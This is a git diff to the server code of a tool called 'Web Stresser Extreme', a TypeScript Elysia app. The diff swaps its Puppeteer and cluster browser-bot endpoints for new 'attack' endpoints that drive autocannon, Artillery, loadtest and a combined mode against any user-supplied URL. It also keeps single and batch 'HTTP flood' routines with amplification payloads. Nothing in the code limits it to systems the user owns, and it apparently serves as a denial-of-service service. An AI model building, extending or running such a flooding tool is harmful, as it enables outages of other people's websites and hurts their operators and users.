@@ -1,9 +1,9 @@
 import { Elysia, t } from 'elysia';
 import { setGlobalDispatcher, Agent } from 'undici';
-import { runPuppeteerBot } from './bots/puppeteerBot.js';
-//import { runSeleniumBot } from './bots/seleniumBot.js';
-//import { runPlaywrightBot } from './bots/playwrightBot.js';
-import { runClusterBot } from './bots/clusterBot.js';
+import { runAutocannon } from './attackers/autocannonAttack.js';
+import { runArtillery } from './attackers/artilleryAttack.js';
+import { runLoadtest } from './attackers/loadtestAttack.js';
+import { runCombinedAttack } from './attackers/combinedAttack.js';
 
 // Optimasi koneksi HTTP
 const globalAgent = new Agent({
@@ -14,7 +14,6 @@ const globalAgent = new Agent({
 });
 setGlobalDispatcher(globalAgent);
 
-// Active users counter
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -23,6 +22,7 @@ setInterval(() => {
   }
 }, 30000);
 
+// Helper functions (amplification, random string, dll)
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -37,6 +37,7 @@ function generateAmplificationPayload(kb: number, ampType: string): string {
   return 'X'.repeat(size);
 }
 
+// Single attack (HTTP flood dengan semua fitur)
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -171,6 +172,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
+// Batch attack (mirip single, tapi dengan concurrency dari frontend)
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -280,8 +282,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Extreme - Full Browser Bot Army (Vercel Ready)',
-    version: '17.0.0',
+    message: 'Web Stresser Extreme - Autocannon/Artillery/Loadtest Edition',
+    version: '2.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -333,34 +335,75 @@ export const app = new Elysia()
       intervalMs: t.Number(),
     }),
   })
-  .post('/api/bot/puppeteer', async ({ body }) => {
-    const { url, loop, intervalMs, headless } = body;
-    const result = await runPuppeteerBot(url, { loop, intervalMs, headless });
-    return result;
+  .post('/api/autocannon', async ({ body }) => {
+    try {
+      const result = await runAutocannon(body as any);
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
   }, {
     body: t.Object({
       url: t.String(),
-      loop: t.Boolean(),
-      intervalMs: t.Number(),
-      headless: t.Boolean(),
+      connections: t.Number(),
+      duration: t.Number(),
+      method: t.Optional(t.String()),
+      headers: t.Optional(t.Record(t.String(), t.String())),
+      body: t.Optional(t.String()),
+      amount: t.Optional(t.Number()),
     }),
   })
-  .post('/api/bot/selenium', async () => {
-    return { success: false, message: 'Selenium not supported on Vercel' };
-  })
-  .post('/api/bot/playwright', async () => {
-    return { success: false, message: 'Playwright not supported on Vercel' };
-  })
-  .post('/api/bot/cluster', async ({ body }) => {
-    const { url, concurrency, totalTasks, loop } = body;
-    const result = await runClusterBot(url, { concurrency, totalTasks, loop });
-    return result;
+  .post('/api/artillery', async ({ body }) => {
+    try {
+      const result = await runArtillery(body as any);
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
   }, {
     body: t.Object({
       url: t.String(),
+      duration: t.Number(),
+      arrivalRate: t.Number(),
+      method: t.Optional(t.String()),
+      headers: t.Optional(t.Record(t.String(), t.String())),
+      body: t.Optional(t.String()),
+    }),
+  })
+  .post('/api/loadtest', async ({ body }) => {
+    try {
+      const result = await runLoadtest(body as any);
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      maxRequests: t.Number(),
       concurrency: t.Number(),
-      totalTasks: t.Number(),
-      loop: t.Boolean(),
+      method: t.Optional(t.String()),
+      headers: t.Optional(t.Record(t.String(), t.String())),
+      body: t.Optional(t.String()),
+      timeout: t.Optional(t.Number()),
+    }),
+  })
+  .post('/api/combined', async ({ body }) => {
+    try {
+      const result = await runCombinedAttack(body as any);
+      return { success: true, result };
+    } catch (err: any) {
+      return { success: false, error: err.message };
+    }
+  }, {
+    body: t.Object({
+      url: t.String(),
+      connections: t.Number(),
+      duration: t.Number(),
+      totalRequests: t.Number(),
+      method: t.Optional(t.String()),
+      headers: t.Optional(t.Record(t.String(), t.String())),
+      body: t.Optional(t.String()),
     }),
   })
   .get('/api/heartbeat', ({ request }) => {
